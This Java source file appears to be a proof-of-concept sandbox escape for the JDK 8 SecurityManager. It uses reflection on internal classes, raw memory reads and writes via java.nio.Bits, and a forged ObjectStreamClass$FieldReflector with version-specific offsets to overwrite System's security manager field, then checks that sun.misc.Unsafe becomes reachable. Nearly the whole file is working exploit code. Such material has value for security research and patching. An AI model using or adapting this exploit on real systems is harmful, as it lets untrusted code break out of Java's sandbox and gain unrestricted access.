//package bar;

import java.util.*;
import sun.misc.*;
import java.lang.reflect.*;
import java.nio.ByteBuffer;
import java.io.*;

class Retro {

  // ~/opt/jdk8u312-b07/Contents/Home/bin/javac Retro.java
  // ~/opt/jdk8u312-b07/Contents/Home/bin/java -Djava.security.manager -Djava.security.policy=./java.policy Retro
  public static void main(String[] argv) {
    SecurityManager _sm = System.getSecurityManager();
    System.out.println("System.getSecurityManager(): " + _sm);
    if (_sm == null) {
      System.out.println("no security manager set. dumping stats:");
      try {
        Class<?> unsafe_class = Class.forName("sun.misc.Unsafe");
        Field theUnsafe = unsafe_class.getDeclaredField("theUnsafe");
        theUnsafe.setAccessible(true);
        Object unsafe = theUnsafe.get(null);
        Method staticFieldOffset = unsafe_class.getMethod("staticFieldOffset", Field.class);
        Field err = System.class.getDeclaredField("err");
        System.out.println("staticFieldOffset of java.lang.System::err: " + staticFieldOffset.invoke(unsafe, err));

        Method objectFieldOffset = unsafe_class.getMethod("objectFieldOffset", Field.class);
        Field mod = Class.class.getDeclaredField("module");
        System.out.println("objectFieldOffset of java.lang.Class::module: " + objectFieldOffset.invoke(unsafe, mod));
      } catch (Throwable t) {
        t.printStackTrace();
      }
      return;
    }

    try {
      Class<?> foo = Class.forName("foo.Foo");
      Method m = foo.getDeclaredMethod("doThing");
      m.setAccessible(true);
      m.invoke(null);
    } catch (Throwable t) {
      t.printStackTrace();
    }
    System.out.print("trying to Class.forName(\"sun.misc.Unsafe\"): ");
    try {
      Object unsafe_class = Class.forName("sun.misc.Unsafe");
      System.out.println("success (shouldn't happen): " + unsafe_class);
    } catch (Throwable t) {
      System.out.println("failed (normal)");
    }

    ByteBuffer bb = ByteBuffer.allocateDirect(8192);
    bb.putInt(0x41414141);
    bb.putInt(0x42424242);
    System.out.print("bb: ");
    for (int i=0; i < bb.position(); i++) {
      System.out.print(bb.get(i));
      System.out.print(" ");
    }
    System.out.println("");
    System.out.println(bb);
    System.out.println(bb.getClass());
    System.out.println(bb.getClass().getSuperclass());
    System.out.println(Arrays.toString(bb.getClass().getInterfaces()));
    System.out.println(Arrays.toString(bb.getClass().getDeclaredFields()));

    try {
      Field unsafe_field = null;
      try {
        unsafe_field = bb.getClass().getDeclaredField("unsafe");
      } catch (Throwable t) {
        t.printStackTrace();
        try {
          unsafe_field = Class.forName("java.nio.Bits").getDeclaredField("UNSAFE"); // 11+
        } catch (Throwable tt) {
          tt.printStackTrace();
        }
      }
      if (unsafe_field != null) {
        try {
          System.out.println(unsafe_field);
          unsafe_field.setAccessible(true);
          Object unsafe = unsafe_field.get(null);
          System.out.println(unsafe);
          System.out.println(unsafe.getClass());

          System.out.print("trying to unsafe.getClass().getMethod(\"getByte\", Object.class, byte.class): ");
          try {
            Method getByteObjOff = unsafe.getClass().getMethod("getByte", Object.class, long.class);
            System.out.println("success (shouldn't happen): " + getByteObjOff);
          } catch (Throwable t) {
            System.out.println("failed (normal)");
          }
        } catch (Throwable t) {
          t.printStackTrace();
        }
      }

      System.out.println("==========");

      try {
        Class Bits = Class.forName("java.nio.Bits");
        Method _getByte = Bits.getDeclaredMethod("_get", long.class);
        _getByte.setAccessible(true);
        Method _putByte = Bits.getDeclaredMethod("_put", long.class, byte.class);
        _putByte.setAccessible(true);

        Method address_0 = bb.getClass().getMethod("address"); //off-heap address
        address_0.setAccessible(true);

        System.out.println(Long.toHexString((Long)address_0.invoke(bb)));
        for (int i = 0; i < 8; i++) {
          System.out.println(_getByte.invoke(null, (Long)address_0.invoke(bb)+i));
          _putByte.invoke(null, (Long)address_0.invoke(bb)+i, (byte)0x43);
        }
        System.out.print("bb: ");
        for (int i=0; i < bb.position(); i++) {
          System.out.print(bb.get(i));
          System.out.print(" ");
        }
        System.out.println("");
      } catch (Throwable t) {
        t.printStackTrace();
      }

      System.out.println("==========");

      try {
        ObjectStreamField osf = new ObjectStreamField("s", long.class);
        ObjectStreamField osfarr[] = new ObjectStreamField[]{osf};

        Class FieldReflector = Class.forName("java.io.ObjectStreamClass$FieldReflector");
        Constructor FieldReflector_cons = FieldReflector.getDeclaredConstructors()[0];
        FieldReflector_cons.setAccessible(true);
        Object fr = FieldReflector_cons.newInstance(new Object[]{osfarr});
        System.out.println(fr);

        Field typeCodes_field = fr.getClass().getDeclaredField("typeCodes");
        typeCodes_field.setAccessible(true);
        typeCodes_field.set(fr, new char[]{'I'});

        Field writeKeys_field = fr.getClass().getDeclaredField("writeKeys");
        writeKeys_field.setAccessible(true);
        writeKeys_field.set(fr, new long[]{Integer.parseInt(argv[0])}); // 8: 116, 11: 124, 17: 124

        Method setPrimFieldValues = fr.getClass().getDeclaredMethod("setPrimFieldValues", Object.class, byte[].class);
        setPrimFieldValues.setAccessible(true);

        System.out.println("System.getSecurityManager(): " + System.getSecurityManager());

        byte zeros[] = new byte[4];
        setPrimFieldValues.invoke(fr, System.class, zeros);

        System.out.println("System.getSecurityManager(): " + System.getSecurityManager());

        System.out.print("trying to Class.forName(\"sun.misc.Unsafe\"): ");
        try {
          Class<?> unsafe_class = Class.forName("sun.misc.Unsafe");
          System.out.println("success (shouldn't happen): " + unsafe_class);

          System.out.print("trying to unsafe_class.getDeclaredField(\"theUnsafe\"): ");
          Field theUnsafe = unsafe_class.getDeclaredField("theUnsafe");
          System.out.println("success (shouldn't happen): " + theUnsafe);

          System.out.print("trying to theUnsafe.setAccessible(true): ");
          theUnsafe.setAccessible(true);
          System.out.println("success (shouldn't happen)");

          System.out.print("trying to theUnsafe.get(null): ");
          Object unsafe = theUnsafe.get(null);
          System.out.println("success (shouldn't happen): " + unsafe);

          System.out.print("trying to unsafe_class.getMethod(\"getByte\", Object.class, byte.class): ");
          Method getByteObjOff = unsafe_class.getMethod("getByte", Object.class, long.class);
          System.out.println("success (shouldn't happen): " + getByteObjOff);
        } catch (Throwable t) {
          System.out.println("failed (normal)");
          t.printStackTrace();
        }
      } catch (Throwable t) {
        t.printStackTrace();
      }


    } catch (Throwable t) {
      t.printStackTrace();
    }
  }
}
